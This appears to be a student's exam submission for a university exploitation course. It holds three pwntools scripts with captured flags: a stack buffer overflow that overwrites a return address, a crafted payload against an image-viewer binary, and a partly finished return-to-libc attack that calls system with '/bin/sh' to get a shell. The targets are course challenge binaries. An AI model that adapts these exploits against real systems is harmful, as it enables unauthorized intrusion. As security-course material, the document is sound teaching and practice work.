Paul Wochnowski z5079392

#assignment
## Flag: COMP6447{it_really_was_due}
#!/usr/bin/env python
# UNSW COMP9447 18s2
# Exam Q1 - Pwnable
from pwn import *
import struct


# Exploit Variables
program = './assignment-was-due-6pm'
host = 'plzpwn.me'
port = 9995
elf = ELF(program)

# libc offsets

# search for gadgets
# libc = ELF('libc.so.6')
# gadget = lambda x : p32(libc.search(asm(x, arch=libc.arch)).next())

# Setup Connection
conn = remote(host, port)
# conn = process(program)
conn.recvuntil('enter: ')
conn.sendline('-1')
conn.recvline()
exp = 'A'*264
exp += p32(0x80485c6)
conn.sendline(exp)
conn.interactive()



#image-viewer
# COMP6447{this_is_a_pic_of_me}
#!/usr/bin/env python
# UNSW COMP9447 18s2
# Exam Q1 - Pwnable
from pwn import *
import struct

#buf is 0x40 (64) long

# Exploit Variables
program = './image-viewer'
# host = 'exam.6447.sec.edu.au'
host = 'plzpwn.me'
port = 9997
elf = ELF(program)

# GOT addrs
printf_got = elf.got['printf']
puts_got = elf.got['puts']

# libc offsets

# search for gadgets
# libc = ELF('libc.so.6')
# gadget = lambda x : p32(libc.search(asm(x, arch=libc.arch)).next())

# Setup Connection
p = remote(host, port)
# p = process(program)
p.recvuntil('> ')
p.sendline('trivialexam' + '\x00' + 'flag' + '\x00'*8 + ('\xfc'+'\xff'*3+p32(0x804a06c))*3)
p.interactive()

#Flag
#This is almost complete, except for the fact that I'm overwriting ebx which contains the GOT offset, this can be fixed by doing some rop chains to load it back into ebx but I'm out of time unfortunateldy
```
#!/usr/bin/env python
# UNSW COMP9447 18s2
# Exam Q1 - Pwnable
from pwn import *
import struct


# Exploit Variables
program = './flag'
host = 'plzpwn.me'
port = 9996
elf = ELF(program)

# GOT addrs
printf_got = elf.got['printf']
puts_got = elf.got['puts']

# libc offsets

# search for gadgets
# libc = ELF('libc.so.6')
# gadget = lambda x : p32(libc.search(asm(x, arch=libc.arch)).next())

# Setup Connection
# p = remote(host, port)
p = process(program)

p.recvuntil('address: ')
main_leak = int(p.recvline().strip(), 16)
log.info('main at ' + hex(main_leak))
p.recvuntil('string: ')
binsh = main_leak + 537
system = main_leak - 399

log.info('binsh at ' + hex(binsh))
log.info('system at ' + hex(system))
p.recvuntil('Hack the program')
p.sendline('b')
pause()
exp = 'A'*12
exp += p32(system) + 'AAAA' + p32(binsh)
p.sendline(exp)
p.interactive()
```